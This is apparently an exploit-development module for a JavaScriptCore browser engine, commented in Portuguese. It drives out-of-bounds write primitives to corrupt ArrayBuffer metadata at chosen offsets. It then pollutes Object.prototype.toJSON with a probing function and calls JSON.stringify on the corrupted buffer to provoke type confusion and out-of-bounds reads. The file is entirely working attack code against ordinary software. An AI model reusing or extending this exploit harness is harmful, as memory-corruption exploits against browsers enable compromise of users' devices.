// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Importada para uso interno
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export let current_toJSON_call_count_for_TypeError_test = 0;

// Esta é a toJSON que tentará escrever e ler em 'this'
export function toJSON_AttemptWriteToThis() {
    // Não usar current_toJSON_call_count_for_TypeError_test++ aqui.
    // Não usar logS3 ou document.title aqui para evitar TypeError conhecido.

    let result_payload = {
        toJSON_executed: "toJSON_AttemptWriteToThis",
        this_type: "N/A",
        this_byteLength_prop: "N/A",
        dataview_created: false,
        written_value: null,
        read_back_value: null,
        write_match: false,
        error_in_toJSON: null,
        oob_read_attempt_val: "N/A",
        oob_write_attempt_status: "N/A"
    };

    try {
        result_payload.this_type = Object.prototype.toString.call(this);
        result_payload.this_byteLength_prop = this.byteLength;

        if (this instanceof ArrayBuffer) {
            let current_this_byteLength = result_payload.this_byteLength_prop;
            if (typeof current_this_byteLength === 'number' && current_this_byteLength >= 4) {
                try {
                    let dv = new DataView(this);
                    result_payload.dataview_created = true;

                    const val_to_write = 0x41424344;
                    dv.setUint32(0, val_to_write, true);
                    result_payload.written_value = toHex(val_to_write);

                    result_payload.read_back_value = toHex(dv.getUint32(0, true));

                    if (dv.getUint32(0, true) === val_to_write) {
                        result_payload.write_match = true;
                    }

                    const original_expected_size = 64; // Ajuste se oob_array_buffer_real tiver outro tamanho base
                    const oob_read_offset = original_expected_size + 8;
                    if (current_this_byteLength > oob_read_offset + 3) {
                        try {
                            result_payload.oob_read_attempt_val = toHex(dv.getUint32(oob_read_offset, true));
                        } catch (e_oob_r) {
                             result_payload.oob_read_attempt_val = `Error reading @${toHex(oob_read_offset)}: ${e_oob_r.name}`;
                        }
                    } else {
                        result_payload.oob_read_attempt_val = `Too small (${current_this_byteLength}b) for OOB read @${toHex(oob_read_offset)}`;
                    }

                } catch (e_dv) {
                    result_payload.error_in_toJSON = `DataView Error: ${e_dv.name} - ${e_dv.message}`;
                }
            } else {
                result_payload.error_in_toJSON = `this (ArrayBuffer) is too small (size: ${current_this_byteLength}) or invalid for DV.`;
            }
        } else {
            result_payload.error_in_toJSON = "this is not an ArrayBuffer.";
        }
    } catch (e_main) {
        result_payload.error_in_toJSON = `EXCEPTION_IN_toJSON: ${e_main.name} - ${e_main.message}`;
        result_payload.this_byteLength_prop = `Error accessing: ${e_main.message}`;
    }

    return result_payload;
}

export async function executeFocusedTestForTypeError(
    testDescription,
    toJSONFunctionToUse,
    valueToWriteOOB,         // Para a corrupção inicial de metadados
    corruptionOffsetToTest,  // Offset da corrupção inicial
    bytesForInitialCorruption
    // bufferToActuallyStringify // PARÂMETRO REMOVIDO
) {
    const FNAME = `executeExploitAttempt<${testDescription}>`; // Nome da função pode ser mais genérico agora
    logS3(`--- Iniciando Teste de Exploração: ${testDescription} ---`, "test", FNAME);
    logS3(`    Corrupção Inicial OOB: Valor=${typeof valueToWriteOOB === 'object' ? valueToWriteOOB.toString(true) : toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)} (${bytesForInitialCorruption}b)`, "info", FNAME);
    document.title = `Iniciando: ${testDescription}`;

    current_toJSON_call_count_for_TypeError_test = 0;

    const ppKey_val = 'toJSON';

    await triggerOOB_primitive(); // Configura o oob_array_buffer_real global
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME);
        document.title = "ERRO OOB Setup - " + FNAME;
        return { errorOccurred: new Error("OOB Setup Failed"), calls: 0, potentiallyCrashed: false, stringifyResult: null };
    }
    // oob_array_buffer_real está agora definido e acessível globalmente (no escopo do módulo)
    logS3(`    Buffer a ser Stringificado: oob_array_buffer_real (após setup e corrupção inicial)`, "info", FNAME);
    document.title = "OOB OK - " + FNAME;


    if (corruptionOffsetToTest !== null && valueToWriteOOB !== null) {
        logS3(`CORRUPÇÃO INICIAL: ${typeof valueToWriteOOB === 'object' ? valueToWriteOOB.toString(true) : toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)} no oob_array_buffer_real`, "warn", FNAME);
        document.title = `Antes OOB Write Meta (${toHex(corruptionOffsetToTest)})`;
        try {
            oob_write_absolute(corruptionOffsetToTest, valueToWriteOOB, bytesForInitialCorruption);
            logS3("Escrita OOB INICIAL feita.", "info", FNAME);
        } catch (e_oob_init) {
            logS3(`ERRO CRÍTICO na escrita OOB inicial: ${e_oob_init.message}`, "error", FNAME);
            clearOOBEnvironment();
            return { errorOccurred: e_oob_init, calls: 0, potentiallyCrashed: false, stringifyResult: null };
        }
    } else {
        logS3("Nenhuma corrupção inicial de metadados OOB especificada.", "info", FNAME);
    }
    
    let stepReached = "apos_escrita_oob_inicial";
    document.title = `Após OOB Write Meta (${toHex(corruptionOffsetToTest)})`;

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    // stepReached já foi definido acima
    let potentiallyCrashed = true;
    let errorCaptured = null;
    let stringifyResult = null;

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${ppKey_val} com função de sondagem...`, "info", FNAME);
        document.title = `Aplicando PP Exploit`;
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = `PP Exploit OK`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify";
        document.title = `Antes Stringify oob_array_buffer_real`;
        logS3(`Chamando JSON.stringify no oob_array_buffer_real (potencialmente corrompido)...`, "info", FNAME);
        
        try {
            // Agora sempre stringifica o oob_array_buffer_real que foi configurado e possivelmente corrompido
            stringifyResult = JSON.stringify(oob_array_buffer_real); 
            stepReached = `apos_stringify`;
            potentiallyCrashed = false; 
            document.title = `Strfy oob_array_buffer_real OK`;
            logS3(`Resultado JSON.stringify: ${typeof stringifyResult === 'string' ? stringifyResult : JSON.stringify(stringifyResult)}`, "info", FNAME);
        } catch (e) {
            stepReached = `erro_stringify`;
            potentiallyCrashed = false; 
            errorCaptured = e;
            document.title = `ERRO Strfy oob_array_buffer_real (${e.name})`;
            logS3(`ERRO CAPTURADO JSON.stringify: ${e.name} - ${e.message}.`, "critical", FNAME);
            if (e.stack) logS3(`   Stack: ${e.stack}`, "error");
            console.error(`JSON.stringify ERROR (${testDescription}):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false;
        errorCaptured = mainError;
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = "ERRO Principal Exploit";
        if (mainError.stack) logS3(`   Stack: ${mainError.stack}`, "error");
        console.error("Main exploit test error:", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}.`, "info", FNAME);
        if (potentiallyCrashed) {
             document.title = `CONGELOU? ${stepReached}`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}.`, "error", FNAME);
        }
    }
    logS3(`--- Teste de Exploração Concluído: ${testDescription} ---`, "test", FNAME);
    if (!potentiallyCrashed && !errorCaptured) {
        document.title = `Teste Exploit OK - ${testDescription}`;
    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { 
        document.title = `ERRO Exploit (${errorCaptured.name}) - ${testDescription}`;
    }
    return { errorOccurred: errorCaptured, calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed, stringifyResult };
}
